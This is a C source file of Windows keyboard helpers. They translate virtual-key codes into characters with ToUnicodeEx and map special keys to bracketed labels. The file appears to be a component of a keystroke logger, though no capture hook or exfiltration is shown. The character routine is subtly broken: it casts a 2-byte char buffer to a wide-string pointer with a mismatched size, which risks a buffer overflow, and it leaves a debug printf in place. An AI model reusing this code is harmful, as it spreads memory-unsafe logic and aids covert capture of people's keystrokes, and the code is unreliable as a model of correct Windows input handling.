#include "winkey.h"

// Function to remove brackets from a string
void remove_brackets(char* str)
{
    char* src = str;
    char* dest = str;

    while (*src) {
        if (*src != '[' && *src != ']') {
            *dest++ = *src;
        }
        src++;
    }
    *dest = '\0';
}

const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
{
    static char key[2] = { 0 };

    // Get the keyboard layout for the current thread.
    HKL keyboardLayout = GetKeyboardLayout(0);

    // Use ToUnicodeEx to translate the virtual key code and scan code into a Unicode character.
    // This function takes into account the keyboard state (e.g., Shift, Caps Lock) and the
    // keyboard layout, which is important for handling different locales and layouts.
    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, (LPWSTR)key, sizeof(key), 0, keyboardLayout);

    if (result == 1) {
        // If ToUnicodeEx successfully translated the key (returns 1 when exactly one character is generated),
        // handle the case of uppercase and lowercase conversion based on Shift and Caps Lock states.

        if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
            // If either Shift is pressed without Caps Lock, or Caps Lock is on without Shift,
            // convert the character to uppercase.
            key[0] = (char)toupper(key[0]);
        }
        else if (!isShiftPressed && !isCapsLockOn) {
            // If neither Shift nor Caps Lock is active, ensure the character is lowercase.
            key[0] = (char)tolower(key[0]);
        }
		key[1] = '\0';  // Null-terminate the string.
		printf("%s\n", key);
    }
    else {
        // If ToUnicodeEx did not return exactly one character, return a placeholder for an unknown key.
        return "[Unknown Key]";
    }

    return key;
}

// Function to get the name of special keys (e.g., F1, Tab, Enter)
const char* get_special_key_name(DWORD vkCode)
{
    switch (vkCode) {
    case VK_TAB: return "[Tab]";
    case VK_RETURN: return "[Enter]";
    case VK_BACK: return "[Backspace]";
    case VK_CAPITAL: return "";
    case VK_ESCAPE: return "[Esc]";
    case VK_SPACE: return "[Space]";
    case VK_PRIOR: return "[Page Up]";
    case VK_NEXT: return "[Page Down]";
    case VK_END: return "[End]";
    case VK_HOME: return "[Home]";
    case VK_LEFT: return "[Left Arrow]";
    case VK_UP: return "[Up Arrow]";
    case VK_RIGHT: return "[Right Arrow]";
    case VK_DOWN: return "[Down Arrow]";
    case VK_INSERT: return "[Insert]";
    case VK_DELETE: return "[Delete]";
    case VK_LWIN: return "[Left Windows]";
    case VK_RWIN: return "[Right Windows]";
    case VK_APPS: return "[Application]";
    case VK_SLEEP: return "[Sleep]";
    case VK_NUMPAD0: return "[Numpad 0]";
    case VK_NUMPAD1: return "[Numpad 1]";
    case VK_NUMPAD2: return "[Numpad 2]";
    case VK_NUMPAD3: return "[Numpad 3]";
    case VK_NUMPAD4: return "[Numpad 4]";
    case VK_NUMPAD5: return "[Numpad 5]";
    case VK_NUMPAD6: return "[Numpad 6]";
    case VK_NUMPAD7: return "[Numpad 7]";
    case VK_NUMPAD8: return "[Numpad 8]";
    case VK_NUMPAD9: return "[Numpad 9]";
    case VK_MULTIPLY: return "[Numpad *]";
    case VK_ADD: return "[Numpad +]";
    case VK_SEPARATOR: return "[Numpad Separator]";
    case VK_SUBTRACT: return "[Numpad -]";
    case VK_DECIMAL: return "[Numpad .]";
    case VK_DIVIDE: return "[Numpad /]";
    case VK_F1: return "[F1]";
    case VK_F2: return "[F2]";
    case VK_F3: return "[F3]";
    case VK_F4: return "[F4]";
    case VK_F5: return "[F5]";
    case VK_F6: return "[F6]";
    case VK_F7: return "[F7]";
    case VK_F8: return "[F8]";
    case VK_F9: return "[F9]";
    case VK_F10: return "[F10]";
    case VK_F11: return "[F11]";
    case VK_F12: return "[F12]";
    case VK_NUMLOCK: return "[Num Lock]";
    case VK_SCROLL: return "[Scroll Lock]";
    case VK_LSHIFT: return "";
    case VK_RSHIFT: return "";
    case VK_LCONTROL: return "";
    case VK_RCONTROL: return "";
    case VK_LMENU: return "";
    case VK_RMENU: return "";
    case VK_VOLUME_MUTE: return "[Volume Mute]";
    case VK_VOLUME_DOWN: return "[Volume Down]";
    case VK_VOLUME_UP: return "[Volume Up]";
    case VK_MEDIA_NEXT_TRACK: return "[Next Track]";
    case VK_MEDIA_PREV_TRACK: return "[Previous Track]";
    case VK_MEDIA_STOP: return "[Stop Media]";
    case VK_MEDIA_PLAY_PAUSE: return "[Play/Pause Media]";
    case VK_LAUNCH_MAIL: return "[Launch Mail]";
    case VK_LAUNCH_MEDIA_SELECT: return "[Launch Media Select]";
    case VK_LAUNCH_APP1: return "[Launch App 1]";
    case VK_LAUNCH_APP2: return "[Launch App 2]";
    case VK_BROWSER_BACK: return "[Browser Back]";
    case VK_BROWSER_FORWARD: return "[Browser Forward]";
    case VK_BROWSER_REFRESH: return "[Browser Refresh]";
    case VK_BROWSER_STOP: return "[Browser Stop]";
    case VK_BROWSER_SEARCH: return "[Browser Search]";
    case VK_BROWSER_FAVORITES: return "[Browser Favorites]";
    case VK_BROWSER_HOME: return "[Browser Home]";
    case VK_OEM_1: return "[OEM 1 (;:)]";
    case VK_OEM_PLUS: return "[OEM Plus (+)]";
    case VK_OEM_COMMA: return "[OEM Comma (,)]";
    case VK_OEM_MINUS: return "[OEM Minus (-)]";
    case VK_OEM_PERIOD: return "[OEM Period (.)]";
    case VK_OEM_2: return "[OEM 2 (/?) ]";
    case VK_OEM_3: return "[OEM 3 (`~)]";
    case VK_OEM_4: return "[OEM 4 ([{)]";
    case VK_OEM_5: return "[OEM 5 (\\|)]";
    case VK_OEM_6: return "[OEM 6 (]}])]";
    case VK_OEM_7: return "[OEM 7 ('\") ]";
    case VK_OEM_8: return "[OEM 8]";
    case VK_OEM_102: return "[OEM 102 (<|>)]";
    default: return "[Unknown Key]";
    }
}
